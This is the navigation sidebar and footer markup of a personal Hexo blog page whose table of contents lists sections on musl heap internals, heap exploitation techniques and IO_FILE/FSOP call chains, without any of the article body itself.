class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90"><span class="nav-text">函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#expand-heap"><span class="nav-text">expand_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#expand-heap-1"><span class="nav-text">__expand_heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#pretrim"><span class="nav-text">pretrim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#trim"><span class="nav-text">trim</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free"><span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#bin-chunk"><span class="nav-text">__bin_chunk</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8"><span class="nav-text">堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink"><span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80-malloc"><span class="nav-text">任意地址 malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-mal-%E5%AE%9E%E7%8E%B0%E8%BF%9E%E7%BB%AD%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80-malloc"><span class="nav-text">劫持 mal 实现连续任意地址 malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%AB%E6%8C%81-brk-%E6%8E%A7%E5%88%B6-malloc-%E8%BF%94%E5%9B%9E%E5%80%BC"><span class="nav-text">劫持 brk 控制 malloc 返回值</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#musl-heap-musl-1-2-3"><span class="nav-text">musl heap (musl-1.2.3)</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-1"><span class="nav-text">基本数据结构</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#deque"><span class="nav-text">deque</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#queue"><span class="nav-text">queue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dequeue"><span class="nav-text">dequeue</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dequeue-head"><span class="nav-text">dequeue_head</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-context"><span class="nav-text">malloc_context</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta-area"><span class="nav-text">meta_area</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#meta"><span class="nav-text">meta</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#get-stride"><span class="nav-text">get_stride</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#free-meta"><span class="nav-text">free_meta</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#alloc-meta"><span class="nav-text">alloc_meta</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#group"><span class="nav-text">group</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#alloc-group"><span class="nav-text">alloc_group</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#chunk-1"><span class="nav-text">chunk</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#get-slot-index"><span class="nav-text">get_slot_index</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-nominal-size"><span class="nav-text">get_nominal_size</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#get-meta"><span class="nav-text">get_meta</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E5%88%86%E6%9E%90-1"><span class="nav-text">函数分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#malloc-1"><span class="nav-text">malloc</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#alloc-slot"><span class="nav-text">alloc_slot</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#try-avail"><span class="nav-text">try_avail</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#enframe"><span class="nav-text">enframe</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-1"><span class="nav-text">free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#nontrivial-free"><span class="nav-text">nontrivial_free</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#free-group"><span class="nav-text">free_group</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%A0%86%E5%88%A9%E7%94%A8-1"><span class="nav-text">堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#unlink-1"><span class="nav-text">unlink</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BB%BB%E6%84%8F%E5%9C%B0%E5%9D%80-malloc%EF%BC%88calloc%EF%BC%89"><span class="nav-text">任意地址 malloc（calloc）</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A0%86%E9%A3%8E%E6%B0%B4"><span class="nav-text">堆风水</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#IO-FILE"><span class="nav-text">IO_FILE</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#IO-FILE-%E7%BB%93%E6%9E%84%E4%BD%93"><span class="nav-text">_IO_FILE 结构体</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FSOP"><span class="nav-text">FSOP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#exit-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">exit  调用链</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#puts-%E8%B0%83%E7%94%A8%E9%93%BE"><span class="nav-text">puts 调用链</span></a></li></ol></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">sky123</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        27 posts in total
                    </span>
                    
                        <span>
                            421.1k words in total
                        </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>



<script src="/js/build/libs/Swup.min.js"></script>

<script src="/js/build/libs/SwupSlideTheme.min.js"></script>

<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>

<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>

<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>

<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>

<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	
<script src="/js/build/tools/imageViewer.js" type="module"></script>

<script src="/js/build/utils.js" type="module"></script>

<script src="/js/build/main.js" type="module"></script>

<script src="/js/build/layouts/navbarShrink.js" type="module"></script>

<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>

<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>

<script src="/js/build/layouts/categoryList.js" type="module"></script>



    
<script src="/js/build/tools/localSearch.js" type="module"></script>




    
<script src="/js/build/tools/codeBlock.js" type="module"></script>




    
<script src="/js/build/layouts/lazyload.js" type="module"></script>




    
<script src="/js/build/tools/runtime.js"></script>

    
<script src="/js/build/libs/odometer.min.js"></script>

    
<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">




  
<script src="/js/build/libs/Typed.min.js"></script>

  
<script src="/js/build/plugins/typed.js" type="module"></script>




    
        
<script src="/js/build/libs/mermaid.min.js"></script>

    
    
<script src="/js/build/plugins/mermaid.js"></script>






    
<script src="/js/build/libs/anime.min.js"></script>





    
<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>

<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>




<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>


<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>





    
<script src="/js/build/layouts/bookmarkNav.js" type="module"></script>


	
</body>

</html>